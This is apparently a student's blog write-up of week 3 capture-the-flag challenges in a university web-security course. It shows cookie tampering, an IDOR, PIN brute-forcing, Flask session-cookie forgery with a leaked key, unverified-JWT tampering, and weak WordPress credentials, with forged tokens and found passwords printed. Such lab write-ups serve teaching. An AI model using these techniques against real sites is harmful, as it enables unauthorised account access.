<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Course CTF: Week 3 - COMP6443 Musings</title><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content=no-transform><meta http-equiv=cache-control content=no-siteapp><meta name=theme-color content=#f8f5ec><meta name=msapplication-navbutton-color content=#f8f5ec><meta name=apple-mobile-web-app-capable content=yes><meta name=apple-mobile-web-app-status-bar-style content=#f8f5ec><meta name=author content=z5206677><meta name=description content="Sales Site: sales."><meta name=keywords content=Hugo,theme,even><meta name=generator content="Hugo 0.58.2 with theme even"><link rel=canonical href=../../../post/course-ctf/week3/><link rel=apple-touch-icon sizes=180x180 href=../../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../../favicon-16x16.png><link rel=manifest href=../../../manifest.json><link rel=mask-icon href=../../../safari-pinned-tab.svg color=#5bbad5><link href=../../../dist/even.c2a46f00.min.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><link rel=stylesheet href=../../../css/overrides.css><link rel=stylesheet href=../../../css/typedjs.shortcode.css><meta property=og:title content="Course CTF: Week 3"><meta property=og:description content="Sales Site: sales."><meta property=og:type content=article><meta property=og:url content=/post/course-ctf/week3/><meta property=article:published_time content=2020-06-15T21:20:50+10:00><meta property=article:modified_time content=2020-06-15T21:20:50+10:00><meta itemprop=name content="Course CTF: Week 3"><meta itemprop=description content="Sales Site: sales."><meta itemprop=datePublished content=2020-06-15T21:20:50&#43;10:00><meta itemprop=dateModified content=2020-06-15T21:20:50&#43;10:00><meta itemprop=wordCount content=516><meta itemprop=keywords content><meta name=twitter:card content=summary><meta name=twitter:title content="Course CTF: Week 3"><meta name=twitter:description content="Sales Site: sales."><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script><script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=../../../ class=logo>COMP6443 Musings</a></div><div class=mobile-navbar-icon><span></span><span></span><span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=../../../><li class=mobile-menu-item>Home</li></a><a href=https://github.com/featherbear/UNSW-COMP6443><li class=mobile-menu-item>GitHub</li></a><a href=../../../categories/report><li class=mobile-menu-item>Report</li></a><a href=../../../categories/><li class=mobile-menu-item>Categories</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=../../../ class=logo>COMP6443 Musings</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=../../../>Home</a></li><li class=menu-item><a class=menu-item-link href=https://github.com/featherbear/UNSW-COMP6443>GitHub</a></li><li class=menu-item><a class=menu-item-link href=../../../categories/report>Report</a></li><li class=menu-item><a class=menu-item-link href=../../../categories/>Categories</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Course CTF: Week 3</h1><div class=post-meta><span class=post-time>2020-06-15</span><div class=post-category><a href=../../../categories/course-ctf/>Course CTF</a></div></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>Contents</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><a href=#sales>Sales</a></li><li><a href=#files-idor>Files - IDOR</a></li><li><a href=#files-deprecated-admin>Files - Deprecated Admin</a></li><li><a href=#files-staff>Files - Staff</a></li><li><a href=#files-you-are-admin>Files - You are admin!</a></li><li><a href=#notes>Notes</a></li><li><a href=#blog-admin-privileges>Blog - Admin Privileges</a></li><li><a href=#blog-post>Blog - Post</a></li><li><a href=#blog-page>Blog - Page</a></li><li><a href=#blog-header>Blog - Header</a></li><li><a href=#blog-sarah>Blog - Sarah</a></li><li><a href=#blog-timmy>Blog - Timmy</a></li></ul></nav></div></div><div class=post-content><h1 id=sales>Sales</h1><p>Site: sales.-QBSITE-</p><p>There is a cookie called <code>metadata</code> which contains <code>YWRtaW49MA%3D%3D</code>.<br>This is base64 for <code>atob(&quot;YWRtaW49MA==&quot;) == &quot;admin=0&quot;</code>.<br>We can change the cookie to <code>btoa(&quot;admin=1&quot;) == &quot;YWRtaW49MQ==&quot; =&gt; &quot;YWRtaW49MQ%3D%3D&quot;</code>.</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=files-idor>Files - IDOR</h1><p>Site: files.-QBSITE-</p><p>We are presented with a logon screen. When trying to register an account with the username &lsquo;admin&rsquo;, we are presented with a &ldquo;Username Taken&rdquo; error.</p><p>When registering a new account, we are given a <code>session</code> cookie which contains some sort of token.<br><code>eyJyb2xlIjp7IiBiIjoiVlhObGNnPT0ifSwidXNlcm5hbWUiOiJhbmRyZXcifQ.XudcFA.RU7FSQUE6K2eoTBNzuXCJ_uJrrU</code></p><p>Inside this token, we see the following</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></pre></td><td class=lntd><pre class=chroma>{
  &#34;role&#34;: {
    &#34; b&#34;: &#34;VXNlcg==&#34;
  },
  &#34;username&#34;: &#34;andrew&#34;
}</pre></td></tr></table></div></div><p><code>VXNlcg==</code> is base64 for &ldquo;User&rdquo;</p><p>It&rsquo;s not a JWT token though&hellip; the data is in the header instead of the payload. Hmmm..</p><p>When we create a new file <code>test</code>, clicking on the link brings us to <code>https://files.-QBSITE-/document/test?r=YW5kcmV3</code> - where <code>YW5kcmV3</code> is base64 for &ldquo;andrew&rdquo;, the username I used</p><p>We can base64 encode the <code>admin</code> username to <code>YWRtaW4=</code>.<br>We can also change the filename to test (I got this purely by guessing)</p><p><code>https://files.-QBSITE-/document/flag?r=YWRtaW4=</code></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=files-deprecated-admin>Files - Deprecated Admin</h1><p>Site: <code>files.-QBSITE-/admin</code><br>Solution File: <a href=./files_pinBrute.py>files_pinBrute.py</a></p><p>Just a 4 digit PIN brute-force. PIN was <code>1024</code></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=files-staff>Files - Staff</h1><p>Site: files.-QBSITE-/#/staff/wfh</p><p>Elevate your user to the &ldquo;Staff&rdquo; role</p><p><a href="https://files.-QBSITE-/document/staff_super_secret_file?r=c2FyYWg=">https://files.-QBSITE-/document/staff_super_secret_file?r=c2FyYWg=</a></p><blockquote><p><code>COMP6443{-flag-redacted-}</p></blockquote><h1 id=files-you-are-admin>Files - You are admin!</h1><p>Site: files.-QBSITE-<br>Solution File: <a href=./files_secureFlask.py>files_secureFlask.py</a></p><p>Our cookie isn&rsquo;t a JWT tokens&hellip; it&rsquo;s a Secure Flask Cookie!</p><p>Inside the <code>staff_flask_secret_key</code>, we have the secret key <code>$hallICompareTHEE2aSummersday</code></p><p>When we decode the secure cookie, we are given the dict</p><p><code>decodeFlaskCookie(&quot;$hallICompareTHEE2aSummersday&quot;, &quot;eyJyb2xlIjp7IiBiIjoiVlhObGNnPT0ifSwidXNlcm5hbWUiOiJhbmRyZXcifQ.XudcFA.RU7FSQUE6K2eoTBNzuXCJ_uJrrU&quot;)</code> =&gt; <code>{'role': b'User', 'username': 'andrew'}</code></p><p>Let&rsquo;s try change our name to <code>admin</code>
<code>encodeFlaskCookie(sk, {'role': b'User', 'username': 'admin'})</code> =&gt; <code>eyJyb2xlIjp7IiBiIjoiVlhObGNnPT0ifSwidXNlcm5hbWUiOiJhZG1pbiJ9.XuodHg.7W5ri76g_qaHArfGMJJaw9l0Les</code></p><p>We can now see <code>flag</code> file from the <code>Files - IDOR</code> challenge&hellip; but surely there&rsquo;s more?</p><p>What if we change the role instead / as well?</p><p><code>encodeFlaskCookie(sk, {'role': b'Admin', 'username': 'andrew'})</code> =&gt; <code>eyJyb2xlIjp7IiBiIjoiUVdSdGFXND0ifSwidXNlcm5hbWUiOiJhbmRyZXcifQ.XuodeQ.Bw12qnQq_LSQrOfM-G16vHJ1xNc</code></p><p>Got it.</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=notes>Notes</h1><p>Site: notes.-QBSITE-</p><p>When first accessed, the site generates a <code>notes_auth</code> cookie containing a JWT token.</p><p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VybmFtZSI6Ino1MjA2Njc3QHF1b2NjYWJhbmsuY29tIiwiZXhwIjoxNTkyMjIxMDEzfQ.NcpRWYdcRsfCmdj0KWAtgMi7PpKDhajHoHMGQ_FIE28</code></p><p>This payload decodes to</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></pre></td><td class=lntd><pre class=chroma>{
  &#34;Username&#34;: &#34;z5206677@-QBSITE-&#34;,
  &#34;exp&#34;: 1592221013
}</pre></td></tr></table></div></div><p>The expiry time instantly lapses, giving us a &ldquo;cookie expired&rdquo; message on subsequent page visits.</p><p>The server doesn&rsquo;t verify the signature of the token, so we can modify the JWT token.</p><p>Firstly, we can modify the expiry time of the claim.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></pre></td><td class=lntd><pre class=chroma>{
  &#34;Username&#34;: &#34;z5206677@-QBSITE-&#34;,
  &#34;exp&#34;: 2592221013
}</pre></td></tr></table></div></div><p>This gives us a new JWT token.<br><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VybmFtZSI6Ino1MjA2Njc3QHF1b2NjYWJhbmsuY29tIiwiZXhwIjoyNTkyMjIxMDEzfQ.r5Kc2jBwK_cJLo7HcqaUqdAsCcSJN1udbmyVxYvKpR4</code></p><p>When reloading the page, the server now no longer gives us the &ldquo;cookie expired&rdquo; message.</p><p>We can then change the username in the claim to <code>admin@-QBSITE-</code>, which upon page reload - gives us the flag.</p><p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VybmFtZSI6ImFkbWluQHF1b2NjYWJhbmsuY29tIiwiZXhwIjoyNTkyMjIxMDEzfQ.nbtB10X81dHfm4-dO8ysxem_Ox9Kqcep_LlbUoWg9v8</code></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=blog-admin-privileges>Blog - Admin Privileges</h1><p>Site: blog.-QBSITE-/wp-admin/index.php</p><p>Log in to Wordpress with <code>admin:admin</code></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=blog-post>Blog - Post</h1><p>Site: blog.-QBSITE-/?page_id=2</p><p>Page crawl</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=blog-page>Blog - Page</h1><p>Site: blog.-QBSITE-/?page_id=53<br>Crawl: <a href=./blog_wpRecon.py>blog_wpRecon.py</a></p><p>Page crawl</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=blog-header>Blog - Header</h1><p>Site: blog.-QBSITE-</p><p>In the <code>&lt;meta&gt;</code> tag in the HTML</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=blog-sarah>Blog - Sarah</h1><p>Site: blog.-QBSITE-</p><p><code>sarah:quocca</code></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=blog-timmy>Blog - Timmy</h1><p>Site: blog.-QBSITE-</p><p>Bruteforcing <code>timmy</code> was hard&hellip;
Bruteforcing the <code>mq</code> account though.. was trivial - and it was an admin account, which let us view all users!</p><blockquote><p><code>mq:1q2w3e</code>
<code>administrator:1q2w3e</code></p><p><code>COMP6443{-flag-redacted-}</code></p></blockquote></div><footer class=post-footer><nav class=post-nav><a class=prev href=../../../post/user-security/><i class="iconfont icon-left"></i><span class="prev-text nav-default">User Security</span>
<span class="prev-text nav-mobile">Prev</span></a>
<a class=next href=../../../post/attacking-web-apps/><span class="next-text nav-default">Attacking Web Apps</span>
<span class="next-text nav-mobile">Next</span>
<i class="iconfont icon-right"></i></a></nav></footer></article></div></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:z5206677@student.unsw.edu.au class="iconfont icon-email" title=email></a><a href=https://www.linkedin.com/in/andrewjinmengwong/ class="iconfont icon-linkedin" title=linkedin></a><a href=https://github.com/featherbear class="iconfont icon-github" title=github></a><a href=https://www.instagram.com/_andrewjwong/ class="iconfont icon-instagram" title=instagram></a><a href=../../../index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>Powered by <a class=hexo-link href=https://gohugo.io>Hugo</a></span>
<span class=division>|</span>
<span class=theme-info>Theme -
<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
<span class=copyright-year>&copy;
2020
<span class=heart><i class="iconfont icon-heart"></i></span><span class=author>Andrew Wong (z5206677)</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script><script type=text/javascript src=../../../dist/even.26188efa.min.js></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-107434487-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script src=../../../js/typed.js@2.0.9></script><script src=../../../js/typedjs.shortcode.js></script><script src=../../../js/offsite.js></script></body></html>